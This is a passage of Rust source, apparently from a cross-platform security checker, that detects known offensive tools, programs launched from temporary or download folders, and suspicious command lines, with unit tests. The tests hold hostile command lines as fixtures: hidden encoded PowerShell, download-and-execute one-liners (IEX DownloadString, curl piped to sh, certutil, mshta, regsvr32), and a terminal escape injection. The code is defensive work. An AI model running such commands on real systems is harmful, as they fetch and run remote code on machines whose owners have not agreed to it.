        let raison = if est(&[mot_masque!("mimikatz"), mot_masque!("invoke-mimikatz")]) {
            tr!(
                "voleur de mots de passe connu (Mimikatz)",
                "known password stealer (Mimikatz)"
            )
        } else if est(&[mot_masque!("rubeus")]) {
            tr!(
                "outil connu d'attaque de Kerberos (Rubeus)",
                "known Kerberos attack tool (Rubeus)"
            )
        } else if est(&[mot_masque!("sharphound")]) {
            tr!(
                "outil connu de reconnaissance d'Active Directory (SharpHound)",
                "known Active Directory reconnaissance tool (SharpHound)"
            )
        } else if est(&[mot_masque!("lazagne")]) {
            tr!(
                "voleur de mots de passe connu (LaZagne)",
                "known password stealer (LaZagne)"
            )
        } else if est(&[mot_masque!("xmrig")]) {
            tr!(
                "mineur de cryptomonnaie connu (XMRig)",
                "known cryptocurrency miner (XMRig)"
            )
        } else if est(&[
            mot_masque!("procdump"),
            mot_masque!("procdump64"),
            mot_masque!("procdump64a"),
        ]) && bas.contains("lsass")
        {
            tr!(
                "copie la mémoire de LSASS, où sont les mots de passe (procdump)",
                "copies the memory of LSASS, where the passwords are (procdump)"
            )
        } else {
            continue;
        };
        return Some((raison, i));
    }
    None
}

/// Le dossier d'où un programme ne devrait pas tourner : temporaire, Téléchargements, Public, corbeille. Un vrai
/// programme s'installe d'abord. Sous Linux, /tmp, /var/tmp et /dev/shm sont déjà jugés par la règle des programmes
/// sans fichier (LNX-PRS-004) : pas deux fois.
pub(crate) fn dossier_douteux(chemin: &str, systeme: Os) -> Option<&'static str> {
    let c = chemin.to_lowercase().replace('\\', "/");
    let dans = |d: &str| c.contains(d);
    // macOS lance une application téléchargée, pas encore déplacée, depuis une copie à part (AppTranslocation) rangée
    // dans le dossier temporaire du compte : elle vient de Téléchargements.
    if dans("/downloads/") || dans("/téléchargements/") || dans("/apptranslocation/") {
        return Some(tr!("lancé depuis Téléchargements", "started from Downloads"));
    }
    let temporaire = match systeme {
        Os::Windows => dans("/appdata/local/temp/") || dans("/windows/temp/"),
        Os::MacOs => {
            ["/tmp/", "/private/tmp/", "/var/tmp/", "/private/var/tmp/"]
                .iter()
                .any(|d| c.starts_with(d))
                || temporaire_du_compte_macos(&c)
        }
        Os::Linux | Os::Tous => false,
    };
    if temporaire && !maintenance_de_windows(&c) {
        return Some(tr!(
            "lancé depuis un dossier temporaire",
            "started from a temporary folder"
        ));
    }
    if dans("/users/public/") || (systeme == Os::MacOs && dans("/users/shared/")) {
        return Some(tr!("rangé dans le dossier Public", "stored in the Public folder"));
    }
    if dans("/$recycle.bin/") || dans("/.trash/") || dans("/.local/share/trash/") {
        return Some(tr!("lancé depuis la corbeille", "started from the recycle bin"));
    }
    None
}

/// Les outils de maintenance de Windows qui tournent d'un dossier temporaire nommé par un GUID pendant une mise à jour
/// (DISM pour les composants, MpSigStub pour les définitions de Defender) : sans cette exception, chaque mise à jour
/// donnerait une alerte. Le nom seul ne suffit pas : il faut aussi le dossier au nom de GUID qui le contient.
const MAINTENANCE: [&str; 2] = ["dismhost.exe", "mpsigstub.exe"];

fn maintenance_de_windows(chemin: &str) -> bool {
    let mut morceaux = chemin.rsplit('/');
    let (Some(fichier), Some(dossier)) = (morceaux.next(), morceaux.next()) else {
        return false;
    };
    let guid = dossier.trim_start_matches('{').trim_end_matches('}');
    let forme = guid.len() == 36
        && guid.char_indices().all(|(i, c)| {
            if matches!(i, 8 | 13 | 18 | 23) {
                c == '-'
            } else {
                c.is_ascii_hexdigit()
            }
        });
    forme && MAINTENANCE.contains(&fichier)
}

/// Le dossier temporaire d'un compte sous macOS : /private/var/folders/<xx>/<…>/T/ (« C » et « X », à côté, sont des
/// caches où Chrome, par exemple, range une copie de lui-même).
fn temporaire_du_compte_macos(c: &str) -> bool {
    let morceaux: Vec<&str> = c.trim_start_matches("/private").split('/').collect();
    morceaux.len() > 6 && morceaux[1] == "var" && morceaux[2] == "folders" && morceaux[5] == "t"
}

/// Interpréteurs dont le vrai programme est le script en argument : un outil offensif en Python ou en PowerShell se
/// reconnaît à ce script.
const INTERPRETEURS: [&str; 8] = ["python", "perl", "ruby", "powershell", "pwsh", "dotnet", "java", "node"];

/// Un interpréteur, quelle que soit sa version (« python3.12 », « pwsh.exe »).
pub(crate) fn interpreteur(fichier: &str) -> bool {
    let nom = fichier.to_ascii_lowercase();
    let nom = nom.strip_suffix(".exe").unwrap_or(&nom);
    INTERPRETEURS.contains(&nom.trim_end_matches(|c: char| c.is_ascii_digit() || c == '.'))
}

/// D'où vient la reconnaissance d'un outil offensif.
#[derive(Clone, Debug, PartialEq, Eq)]
pub(crate) enum Origine {
    /// Le programme lui-même : le nom du processus, son fichier, ou le premier mot de sa ligne de commande.
    Programme,
    /// Un argument d'un interpréteur (le mot tel qu'il est écrit) : le script lancé, peut-être, mais le processus
    /// est l'interpréteur ; le blocage n'y voit qu'un doute.
    Argument(String),
}

/// Un outil offensif connu en marche, la raison « outil offensif » de COM-PRG-001, et d'où vient la reconnaissance :
/// seule celle du programme lui-même est certaine pour le blocage automatique. Le nom du processus, celui de son
/// fichier, le premier mot de sa ligne de commande et, pour un interpréteur, chaque mot de la suite, où est le script.
pub(crate) fn offensif(p: &EnMarche) -> Option<(&'static str, Origine)> {
    let ligne = p.ligne.as_deref().unwrap_or("");
    let premier = ligne.split_whitespace().next().unwrap_or("");
    let mut noms = vec![p.nom.as_str(), p.chemin.as_deref().unwrap_or(""), premier];
    if interpreteur(nom_de_fichier(premier)) || interpreteur(nom_de_fichier(&p.nom)) {
        noms.extend(ligne.split_whitespace().skip(1));
    }
    let (raison, i) = outil_offensif(&noms, ligne)?;
    let origine = if i < 3 {
        Origine::Programme
    } else {
        Origine::Argument(noms[i].to_string())
    };
    Some((raison, origine))
}

/// Le signe le plus sûr qu'un programme en marche fait partie d'une attaque, ou `None`. Dans l'ordre : un outil
/// offensif connu, une ligne de commande qui télécharge ou cache ce qu'elle exécute, puis un programme lancé d'un
/// dossier où rien ne s'installe (moyen, élevé s'il a été effacé depuis).
pub(crate) fn juger_programme(p: &EnMarche, systeme: Os) -> Option<Soupcon> {
    let ligne = p.ligne.as_deref().unwrap_or("");
    if let Some((raison, _)) = offensif(p) {
        return Some(Soupcon {
            niveau: Niveau::Eleve,
            raison,
            extrait: None,
            efface: false,
        });
    }
    if let Some((raison, extrait)) = commande_suspecte(ligne) {
        return Some(Soupcon {
            niveau: Niveau::Eleve,
            raison,
            extrait: Some(extrait),
            efface: false,
        });
    }
    let chemin = p.chemin.as_deref()?;
    let raison = dossier_douteux(chemin, systeme)?;
    Some(Soupcon {
        niveau: if p.sans_fichier { Niveau::Eleve } else { Niveau::Moyen },
        raison,
        extrait: Some(extrait(chemin, false)),
        efface: p.sans_fichier,
    })
}

/// Les processus de Vanguard lui-même, jamais montrés : celui-ci, ceux du même programme (une autre fenêtre, la copie
/// élevée en administrateur), et tout ce qu'ils ont lancé (PowerShell, journalctl, ps pendant le bilan). Un parent né
/// après son enfant n'est pas son parent : sous Windows, le numéro d'un parent mort (celui de l'explorateur, par
/// exemple) peut avoir été repris par Vanguard, qui aurait sinon écarté l'explorateur et tout ce qu'il a lancé. Sans
/// les deux dates, le lien est gardé.
pub(crate) fn de_vanguard(liste: &[EnMarche], moi: u32, mon_programme: Option<&str>) -> HashSet<u32> {
    let meme_programme = |c: &str| {
        mon_programme.is_some_and(|m| {
            if cfg!(windows) {
                c.eq_ignore_ascii_case(m)
            } else {
                c == m
            }
        })
    };
    let mut racines: Vec<u32> = liste
        .iter()
        .filter(|p| p.chemin.as_deref().is_some_and(meme_programme))
        .map(|p| p.pid)
        .collect();
    racines.push(moi);
    let nes: HashMap<u32, NaiveDateTime> = liste.iter().filter_map(|p| Some((p.pid, p.ne?))).collect();
    let paires: Vec<(u32, u32)> = liste
        .iter()
        .filter_map(|p| {
            let parent = p.parent?;
            let numero_repris =
                p.ne.zip(nes.get(&parent))
                    .is_some_and(|(enfant, parent)| *parent > enfant);
            (!numero_repris).then_some((p.pid, parent))
        })
        .collect();
    let mut ecartes: HashSet<u32> = racines.iter().copied().collect();
    for racine in racines {
        ecartes.extend(crate::commande::descendants(&paires, racine));
    }
    ecartes
}

/// Les ancêtres de `pid` (parent, grand-parent…) d'après la liste : le terminal, le shell ou la session SSH d'où
/// Vanguard a été lancé. Les arrêter couperait la session en cours. Un parent né après son enfant n'est pas son
/// parent (numéro repris, voir `de_vanguard`) : la remontée s'arrête là. 1 000 au plus, contre une boucle.
pub(crate) fn ancetres(liste: &[EnMarche], pid: u32) -> Vec<u32> {
    let par_pid: HashMap<u32, &EnMarche> = liste.iter().map(|p| (p.pid, p)).collect();
    let mut trouves = Vec::new();
    let mut courant = pid;
    while let Some(p) = par_pid.get(&courant)
        && let Some(parent) = p.parent
        && trouves.len() < 1000
    {
        let repris =
            p.ne.zip(par_pid.get(&parent).and_then(|q| q.ne))
                .is_some_and(|(enfant, parent)| parent > enfant);
        if repris || parent == courant || trouves.contains(&parent) || parent == pid {
            break;
        }
        trouves.push(parent);
        courant = parent;
    }
    trouves
}

/// Pour le blocage : les programmes en marche, et ceux qu'il ne faut jamais arrêter parce qu'ils sont Vanguard, ce
/// qu'il a lancé, ou ce qui le fait tourner (ses ancêtres). `None` : la liste ne se lit pas.
pub(crate) fn en_marche() -> Option<(Vec<EnMarche>, HashSet<u32>)> {
    let (liste, _) = programmes_en_marche().filter(|(l, _)| !l.is_empty())?;
    let mon_programme = std::env::current_exe().ok().map(|c| {
        let c = c.to_string_lossy();
        c.strip_suffix(" (deleted)").unwrap_or(&c).to_string()
    });
    let moi = std::process::id();
    let mut intouchables = de_vanguard(&liste, moi, mon_programme.as_deref());
    intouchables.extend(ancetres(&liste, moi));
    Some((liste, intouchables))
}

/// Un programme repéré, tel qu'il est montré : son nom (choisi par qui l'a lancé, rendu inoffensif), son numéro, la
/// raison, et ce qu'on montre de lui.
pub(crate) fn montrer(p: &EnMarche, s: &Soupcon) -> String {
    let efface = if s.efface {
        tr!(", effacé depuis", ", deleted since")
    } else {
        ""
    };
    let suite = s.extrait.as_deref().map(|e| format!(" ({e})")).unwrap_or_default();
    trf!(
        "« {} » (PID {}) {}{efface}{suite}",
        "“{}” (PID {}) {}{efface}{suite}",
        affichable(&p.nom),
        p.pid,
        s.raison
    )
}

/// Que faire devant un programme repéré : rien d'arrêté à la hâte (l'intrus verrait qu'il est découvert, et ses
/// traces partiraient avec lui), noter d'où il vient, puis le parcours de Vanguard après une infection.
fn conseil_programmes() -> &'static str {
    tr!(
        "Ne rien arrêter à la hâte : garder ses traces (vanguard depanner traces note son chemin, son parent, sa ligne de commande), puis suivre Dépanner › Après une infection s'il n'est pas à vous",
        "Do not stop anything in a hurry: keep its traces (vanguard depanner traces notes its path, parent and command line), then follow Troubleshoot › After an infection if it is not yours"
    )
}

/// Les constats d'après les programmes en marche, ceux de Vanguard (`ecartes`) mis à part. `partiel` : ce que la
/// lecture n'a pas pu voir, dit avec le constat sain.
pub(crate) fn juger_programmes(
    liste: &[EnMarche],
    systeme: Os,
    ecartes: &HashSet<u32>,
    partiel: Option<&str>,
) -> Vec<Constat> {
    let examines: Vec<&EnMarche> = liste.iter().filter(|p| !ecartes.contains(&p.pid)).collect();
    let mut reperes: Vec<(&EnMarche, Soupcon)> = examines
        .iter()
        .filter_map(|p| Some((*p, juger_programme(p, systeme)?)))
        .collect();
    reperes.sort_by_key(|(p, s)| (std::cmp::Reverse(s.niveau), p.pid));
    let mut constats = Vec::new();
    let eleves: Vec<String> = reperes
        .iter()
        .filter(|(_, s)| s.niveau == Niveau::Eleve)
        .map(|(p, s)| montrer(p, s))
        .collect();
    if !eleves.is_empty() {
        constats.push(
            alerte(
                "Programmes",
                Niveau::Eleve,
                trf!(
                    "Programme(s) en marche qui ont la forme d'une attaque : {}.",
                    "Running program(s) shaped like an attack: {}.",
                    resume(&eleves, 4, tr!(" ; ", "; "))
                ),
            )
            .manuel(
                conseil_programmes(),
                &["vanguard depanner traces", "vanguard depanner infection"],
            ),
        );
    }
    let moyens: Vec<String> = reperes
        .iter()
        .filter(|(_, s)| s.niveau == Niveau::Moyen)
        .map(|(p, s)| montrer(p, s))
        .collect();
    if !moyens.is_empty() {
        constats.push(
            alerte(
                "Programmes",
                Niveau::Moyen,
                trf!(
                    "Programme(s) en marche depuis un dossier où rien ne s'installe : {}. Un installateur en cours l'explique ; sinon, c'est un programme déposé là.",
                    "Program(s) running from a folder where nothing gets installed: {}. An installer in progress explains it; otherwise, it is a program dropped there.",
                    resume(&moyens, 4, tr!(" ; ", "; "))
                ),
            )
            .manuel(conseil_programmes(), &["vanguard depanner traces"]),
        );
    }
    if constats.is_empty() {
        let n = examines.len();
        let mut texte = trf!(
            "Aucun des {n} programmes en marche n'a la forme d'une attaque : ni outil offensif connu, ni commande qui télécharge ou cache ce qu'elle exécute, ni programme lancé d'un dossier où rien ne s'installe.",
            "None of the {n} running programs is shaped like an attack: no known offensive tool, no command that downloads or hides what it runs, no program started from a folder where nothing gets installed."
        );
        let en_partie = examines
            .iter()
            .filter(|p| p.ligne.is_none() || p.chemin.is_none())
            .count();
        if en_partie > 0 {
            texte.push(' ');
            // En administrateur, il ne reste que les processus protégés par le système : le dire tel quel.
            texte.push_str(&if crate::traces::privilegie() {
                trf!(
                    "{en_partie} d'entre eux, protégés par le système, ne montrent pas leur ligne de commande ou leur chemin, même en administrateur : vérifiés en partie.",
                    "{en_partie} of them, protected by the system, do not show their command line or path, even as administrator: partly checked."
                )
            } else {
                trf!(
                    "{en_partie} d'entre eux (d'autres comptes, ou protégés) ne montrent pas leur ligne de commande ou leur chemin sans droits d'administrateur : vérifiés en partie.",
                    "{en_partie} of them (other accounts, or protected) do not show their command line or path without administrator rights: partly checked."
                )
            });
        }
        if let Some(p) = partiel {
            texte.push(' ');
            texte.push_str(p);
        }
        constats.push(ok("Programmes", texte));
    }
    constats
}

/// La vérification : les programmes en marche, lus par le système, jugés un par un.
fn programmes_suspects() -> Vec<Constat> {
    let Some((liste, partiel)) = programmes_en_marche().filter(|(l, _)| !l.is_empty()) else {
        return vec![impossible(
            "Programmes",
            tr!(
                "liste des programmes en marche illisible",
                "list of running programs unreadable"
            ),
        )];
    };
    let mon_programme = std::env::current_exe().ok().map(|c| {
        let c = c.to_string_lossy();
        c.strip_suffix(" (deleted)").unwrap_or(&c).to_string()
    });
    let ecartes = de_vanguard(&liste, std::process::id(), mon_programme.as_deref());
    juger_programmes(&liste, Os::actuel(), &ecartes, partiel)
}

/// Les programmes en marche d'après /proc, sans droits : le nom et le parent (status), la ligne de commande
/// (cmdline, lisible pour tous), le programme (exe, lisible pour ceux du compte seulement). Les fils du noyau, sans
/// programme ni ligne de commande, ne sont pas des programmes.
#[cfg(target_os = "linux")]
fn programmes_en_marche() -> Option<(Vec<EnMarche>, Option<&'static str>)> {
    use super::linux::dissimulation::{pids_listes, proc_masque};
    let pids = pids_listes()?;
    let montages = std::fs::read_to_string("/proc/self/mounts").unwrap_or_default();
    let liste = pids
        .into_iter()
        .filter_map(|pid| {
            let racine = std::path::PathBuf::from(format!("/proc/{pid}"));
            let status = std::fs::read_to_string(racine.join("status")).ok()?;
            let champ = |nom: &str| status.lines().find_map(|l| l.strip_prefix(nom)).map(str::trim);
            let nom = champ("Name:")?.to_string();
            let parent = champ("PPid:").and_then(|p| p.parse().ok());
            let ligne = std::fs::read(racine.join("cmdline"))
                .ok()
                .map(|o| {
                    o.split(|&b| b == 0)
                        .filter(|m| !m.is_empty())
                        .map(String::from_utf8_lossy)
                        .collect::<Vec<_>>()
                        .join(" ")
                })
                .filter(|l| !l.is_empty());
            let lien = std::fs::read_link(racine.join("exe"))
                .ok()
                .map(|l| l.to_string_lossy().into_owned());
            if ligne.is_none() && lien.is_none() {
                return None;
            }
            let sans_fichier = lien.as_deref().is_some_and(|l| l.ends_with(" (deleted)"));
            let chemin = lien.map(|l| l.strip_suffix(" (deleted)").map_or_else(|| l.clone(), str::to_string));
            Some(EnMarche {
                pid,
                parent,
                nom,
                chemin,
                ligne,
                sans_fichier,
                ne: None,
            })
        })
        .collect();
    let partiel = proc_masque(&montages).then_some(tr!(
        "/proc ne montre que vos programmes (hidepid) : ceux des autres comptes ne sont pas vérifiés.",
        "/proc only shows your programs (hidepid): those of other accounts are not checked."
    ));
    Some((liste, partiel))
}

/// Les programmes en marche d'après WMI (Win32_Process : chemin et ligne de commande, ceux des autres comptes
/// seulement en administrateur), Toolhelp32 en secours, sans les lignes de commande. Un chemin que WMI ne donne pas se
/// demande au processus lui-même, ce que les droits limités permettent pour la plupart.
#[cfg(windows)]
#[allow(clippy::unnecessary_wraps)] // même signature que sous Linux et macOS, où la lecture peut échouer
fn programmes_en_marche() -> Option<(Vec<EnMarche>, Option<&'static str>)> {
    use super::windows::{processus, wmi};
    let par_wmi = wmi::requete(
        r"root\cimv2",
        "Win32_Process",
        "",
        &[
            "ProcessId",
            "ParentProcessId",
            "Name",
            "ExecutablePath",
            "CommandLine",
            "CreationDate",
        ],
    );
    let mut liste: Vec<EnMarche> = match par_wmi {
        Some(lignes) if !lignes.is_empty() => lignes
            .iter()
            .filter_map(|p| {
                let texte = |c: &str| p[c].texte().map(str::to_string).filter(|t| !t.is_empty());
                Some(EnMarche {
                    pid: u32::try_from(p["ProcessId"].entier()?).ok()?,
                    parent: p["ParentProcessId"].entier().and_then(|n| u32::try_from(n).ok()),
                    nom: texte("Name").unwrap_or_default(),
                    chemin: texte("ExecutablePath"),
                    ligne: texte("CommandLine"),
                    sans_fichier: false,
                    ne: p["CreationDate"].texte().and_then(date_cim),
                })
            })
            .collect(),
        _ => processus::liste()
            .into_iter()
            .map(|p| EnMarche {
                pid: p.pid,
                parent: Some(p.parent),
                nom: p.nom,
                ..EnMarche::default()
            })
            .collect(),
    };
    for p in &mut liste {
        if p.chemin.is_none() {
            p.chemin = processus::chemin(p.pid);
        }
        p.sans_fichier = p.chemin.as_deref().is_some_and(|c| !std::path::Path::new(c).exists());
    }
    Some((liste, None))
}

/// Les programmes en marche, demandés au noyau (libproc : le chemin du programme pour tous les comptes, la ligne de
/// commande pour ceux du compte, la naissance) ; ps en secours tant que le test d'oracle de macos.yml n'a pas prouvé
/// la lecture native, ou quand elle ne répond pas.
#[cfg(target_os = "macos")]
fn programmes_en_marche() -> Option<(Vec<EnMarche>, Option<&'static str>)> {
    if let Some(liste) = super::macos::noyau::processus(true) {
        let liste = liste
            .into_iter()
            .map(|p| EnMarche {
                pid: p.pid,
                parent: Some(p.ppid),
                nom: p.nom(),
                sans_fichier: p.chemin.as_deref().is_some_and(|c| !std::path::Path::new(c).exists()),
                ligne: p.ligne(),
                ne: p.ne(),
                chemin: p.chemin,
            })
            .collect();
        return Some((liste, None));
    }
    programmes_ps()
}

/// Les programmes en marche d'après ps (le chemin du programme, puis la ligne de commande), comme les traces les
/// lisent : le secours de la lecture native.
#[cfg(target_os = "macos")]
fn programmes_ps() -> Option<(Vec<EnMarche>, Option<&'static str>)> {
    use std::process::Command;
    let ps = |format: &str| {
        crate::commande::lancer(Command::new("ps").args(["-axww", "-o", format]).env("LC_ALL", "C"), 20)
            .filter(|r| r.code == Some(0))
            .map(|r| r.sortie)
    };
    let liste = ps("pid=,ppid=,user=,lstart=,comm=")?;
    let lignes = ps("pid=,args=")
        .map(|s| crate::traces::lire_args(&s))
        .unwrap_or_default();
    let liste = crate::traces::lire_ps(&liste)
        .into_iter()
        .map(|(pid, parent, _, _, programme)| {
            let chemin = programme.starts_with('/').then(|| programme.clone());
            EnMarche {
                pid,
                parent,
                nom: nom_de_fichier(&programme).to_string(),
                sans_fichier: chemin.as_deref().is_some_and(|c| !std::path::Path::new(c).exists()),
                chemin,
                ligne: lignes.get(&pid).cloned(),
                ne: None,
            }
        })
        .collect();
    Some((liste, None))
}

/// Une date CIM de WMI (« 20261021063000.123456-240 », décalage en minutes) en UTC, à la microseconde : un parent et
/// son enfant nés dans la même seconde restent dans l'ordre.
#[cfg(any(windows, test))]
fn date_cim(texte: &str) -> Option<NaiveDateTime> {
    let locale = NaiveDateTime::parse_from_str(texte.get(..21)?, "%Y%m%d%H%M%S%.f").ok()?;
    let decalage: i64 = texte.get(21..)?.parse().ok()?;
    Some(locale - chrono::TimeDelta::minutes(decalage))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn ip(texte: &str) -> IpAddr {
        texte.parse().unwrap()
    }

    fn echec(adresse: &str) -> Tentative {
        Tentative {
            adresse: ip(adresse),
            compte: String::new(),
            reussie: false,
        }
    }

    fn reussite(adresse: &str, compte: &str) -> Tentative {
        Tentative {
            adresse: ip(adresse),
            compte: compte.into(),
            reussie: true,
        }
    }

    /// Dix échecs puis une réussite depuis la même adresse : une intrusion. Neuf, une autre adresse, une réussite
    /// avant les échecs ou la machine elle-même : rien.
    #[test]
    fn maintenance_de_windows_epargnee() {
        let dism = r"C:\Windows\Temp\{0A1B2C3D-4E5F-6789-ABCD-EF0123456789}\DismHost.exe";
        assert!(dossier_douteux(dism, Os::Windows).is_none());
        let defender = r"C:\Users\alice\AppData\Local\Temp\0a1b2c3d-4e5f-6789-abcd-ef0123456789\MpSigStub.exe";
        assert!(dossier_douteux(defender, Os::Windows).is_none());
        // Le même nom ailleurs, ou un autre programme dans un dossier GUID : toujours signalé.
        assert!(dossier_douteux(r"C:\Windows\Temp\DismHost.exe", Os::Windows).is_some());
        assert!(
            dossier_douteux(
                r"C:\Windows\Temp\{0A1B2C3D-4E5F-6789-ABCD-EF0123456789}\x.exe",
                Os::Windows
            )
            .is_some()
        );
    }

    #[test]
    fn mot_de_passe_devine() {
        let mut t: Vec<Tentative> = (0..SEUIL_ECHECS).map(|_| echec("203.0.113.7")).collect();
        t.push(reussite("203.0.113.7", "alice"));
        t.push(reussite("203.0.113.7", "alice"));
        assert_eq!(
            intrusions(&t),
            [Intrusion {
                adresse: ip("203.0.113.7"),
                compte: "alice".into(),
                echecs: SEUIL_ECHECS
            }]
        );
        // Neuf échecs seulement.
        assert_eq!(intrusions(&t[1..]), Vec::<Intrusion>::new());
        // La réussite vient d'une autre adresse que les échecs.
        let mut autre: Vec<Tentative> = (0..30).map(|_| echec("203.0.113.7")).collect();
        autre.push(reussite("192.0.2.4", "alice"));
        assert_eq!(intrusions(&autre), Vec::<Intrusion>::new());
        // La réussite d'abord, les échecs ensuite : quelqu'un d'autre a essayé après.
        let mut avant = vec![reussite("203.0.113.7", "alice")];
        avant.extend((0..30).map(|_| echec("203.0.113.7")));
        assert_eq!(intrusions(&avant), Vec::<Intrusion>::new());
        // La machine elle-même.
        let mut locale: Vec<Tentative> = (0..30).map(|_| echec("127.0.0.1")).collect();
        locale.push(reussite("127.0.0.1", "alice"));
        assert_eq!(intrusions(&locale), Vec::<Intrusion>::new());
    }

    #[test]
    fn constat_d_intrusion() {
        assert!(juger_intrusions(&[], Os::Linux, None).probleme.is_none());
        let internet = Intrusion {
            adresse: ip("203.0.113.7"),
            compte: "alice".into(),
            echecs: 42,
        };
        let c = juger_intrusions(std::slice::from_ref(&internet), Os::Linux, None);
        assert_eq!(c.probleme, Some(Niveau::Critique));
        assert!(c.verifie);
        assert!(
            c.message.contains("203.0.113.7") && c.message.contains("alice") && c.message.contains("42"),
            "{}",
            c.message
        );
        let k = c.correctif.unwrap();
        assert!(!k.automatique && k.action.contains("alice") && k.action.contains("PasswordAuthentication"));
        assert_eq!(k.commandes, ["vanguard depanner traces"]);
        // Une adresse du réseau local : toujours critique, avec l'explication d'un appareil de la maison.
        let locale = Intrusion {
            adresse: ip("10.0.0.20"),
            compte: "alice".into(),
            echecs: 12,
        };
        let c = juger_intrusions(&[locale], Os::Windows, None);
        assert_eq!(c.probleme, Some(Niveau::Critique));
        assert!(
            c.message.contains(tr!("réseau local", "local network")),
            "{}",
            c.message
        );
        assert!(
            c.correctif
                .unwrap()
                .action
                .contains(tr!("Bureau à distance", "Remote Desktop"))
        );
        // Un nom de compte piégé ne pilote pas le terminal.
        let piege = Intrusion {
            adresse: ip("203.0.113.7"),
            compte: "x\x1b]52;c;eA==\x07".into(),
            echecs: 10,
        };
        let c = juger_intrusions(&[piege], Os::Linux, None);
        assert!(!c.message.contains('\x1b') && !c.correctif.unwrap().action.contains('\x1b'));
    }

    /// macOS : rien n'écoute sur 22 ni sur le port de ssh et aucun sshd ne tourne : rien à lire, comme sous Linux sans
    /// serveur SSH. sshd en écoute, même sur la machine elle-même ou sur un autre port, sshd en marche, ou netstat ou
    /// ps muets : non vérifié, jamais sain.
    #[test]
    fn mac_sans_sshd() {
        let ports = |liste: &[(&str, u16)]| -> Vec<(String, u16)> {
            liste.iter().map(|(a, p)| ((*a).to_string(), *p)).collect()
        };
        let autres = ports(&[("*", 5900), ("127.0.0.1", 631), ("*", 2222)]);
        assert!(tentatives_sans_journal(Some(&[]), Some(22), Some(false)).is_none());
        assert!(tentatives_sans_journal(Some(&autres), Some(22), Some(false)).is_none());
        assert!(tentatives_sans_journal(Some(&autres), None, Some(false)).is_none());
        for (ecoute, port_ssh, en_marche) in [
            (ports(&[("*", 22)]), Some(22), Some(false)),
            (ports(&[("127.0.0.1", 22)]), Some(22), Some(false)),
            (ports(&[("::1", 22), ("*", 5900)]), Some(22), Some(false)),
            // Session à distance déplacée par /etc/services : launchd écoute sur 2222.
            (autres.clone(), Some(2222), Some(false)),
            // Un sshd de Homebrew lancé avec -p 2222 : il tourne.
            (autres.clone(), Some(22), Some(true)),
        ] {
            let Some(Err(c)) = tentatives_sans_journal(Some(&ecoute), port_ssh, en_marche) else {
                panic!("sshd compté comme lu : {ecoute:?} {port_ssh:?} {en_marche:?}");
            };
            assert!(!c.verifie && c.message.contains("sshd"), "{}", c.message);
        }
        let Some(Err(c)) = tentatives_sans_journal(None, Some(22), Some(false)) else {
            panic!("netstat muet compté comme sain");
        };
        assert!(!c.verifie && c.message.contains("netstat"), "{}", c.message);
        let Some(Err(c)) = tentatives_sans_journal(Some(&autres), Some(22), None) else {
            panic!("ps muet compté comme sain");
        };
        assert!(!c.verifie && c.message.contains("ps"), "{}", c.message);
        // sshd en écoute sur 22 et ps muet : la raison est le journal non lu, pas ps.
        let Some(Err(c)) = tentatives_sans_journal(Some(&ports(&[("*", 22)])), Some(22), None) else {
            panic!("sshd en écoute compté comme lu");
        };
        assert!(
            c.message.contains("sshd") && !c.message.starts_with("ps"),
            "{}",
            c.message
        );
        assert!(plist_de_sshd(b"<string>/usr/sbin/sshd</string>") && !plist_de_sshd(b"<string>/usr/bin/ssh</string>"));
    }

    #[test]
    fn port_ssh_d_etc_services() {
        let services = "# Network services\n\
                        sshell 614/tcp\n\
                        ssh              2222/udp     # SSH Remote Login Protocol\n\
                        ssh              2222/tcp     # SSH Remote Login Protocol\n\
                        telnet 23/tcp\n";
        assert_eq!(port_ssh(services), Some(2222));
        assert_eq!(port_ssh("#ssh 22/tcp\nssh 22/tcp\n"), Some(22));
        assert_eq!(port_ssh(""), None);
    }

    /// Une lecture qui a atteint sa borne (les 2 000 échecs les plus récents sous Windows) : sain, jamais sans le dire.
    #[test]
    fn lecture_partielle_dite() {
        let c = juger_intrusions(&[], Os::Windows, Some("Lecture partielle : x."));
        assert!(c.verifie && c.probleme.is_none());
        assert!(c.message.ends_with("Lecture partielle : x."), "{}", c.message);
        assert!(
            !juger_intrusions(&[], Os::Windows, None)
                .message
                .contains("Lecture partielle")
        );
    }

    fn suspect(ligne: &str) -> Option<String> {
        commande_suspecte(ligne).map(|(_, e)| e)
    }

    /// Les formes d'une attaque dans une ligne de commande, coupées juste après le motif ; l'usage ordinaire des mêmes
    /// outils ne dit rien.
    #[test]
    fn lignes_de_commande_suspectes() {
        // PowerShell : commande cachée, texte exécuté, script téléchargé. Ce qui suit le motif n'est pas montré.
        let e =
            suspect(r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -enc SQBFAFgA").unwrap();
        assert_eq!(e, "powershell.exe … -enc…");
        assert!(suspect("powershell -EncodedCommand SQBFAFgA").is_some());
        assert!(suspect("pwsh.exe /ec SQBFAFgA").is_some());
        let e = suspect(
            r#"powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://x.example/a.ps1?jeton=s3cret')""#,
        )
        .unwrap();
        assert_eq!(e, "powershell … IEX…");
        let e =
            suspect("powershell -c (New-Object Net.WebClient).DownloadString('http://x.example/?k=s3cret')").unwrap();
        assert!(e.ends_with("DownloadString…") && !e.contains("s3cret"), "{e}");
        // Les autres outils de Windows détournés.
        assert_eq!(
            suspect("mshta.exe https://x.example/a.hta").unwrap(),
            "mshta.exe https:…"
        );
        assert!(suspect("mshta vbscript:Execute(\"x\")").is_some());
        assert!(suspect("certutil.exe -urlcache -split -f http://x.example/a.exe a.exe").is_some());
        assert!(suspect("certutil -decode a.txt a.exe").is_some());
        assert_eq!(
            suspect("regsvr32 /s /n /u /i:http://x.example/a.sct scrobj.dll").unwrap(),
            "regsvr32 … /i:http…"
        );
        assert!(suspect(r#"rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ""#).is_some());
        assert!(suspect("bitsadmin /transfer job http://x.example/a.exe C:\\a.exe").is_some());
        // Linux et macOS : un script téléchargé ou décodé passé à un shell.
        let e = suspect("sh -c curl -fsSL https://x.example/i.sh?jeton=s3cret | sh").unwrap();
        assert_eq!(e, "sh … curl…");
        assert!(suspect("bash -c wget -qO- http://x.example/a | /bin/bash").is_some());
        assert!(suspect("sh -c curl -s http://x.example/a | sudo -E bash").is_some());
        assert!(
            suspect("sh -c echo aGk= | base64 -d | sh")
                .unwrap()
                .ends_with("base64 -d…")
        );
        // Usages ordinaires : rien.
        for ligne in [
            "powershell.exe",
            r#""C:\Program Files\PowerShell\7\pwsh.exe" -NoProfile -File C:\Scripts\sauvegarde.ps1"#,
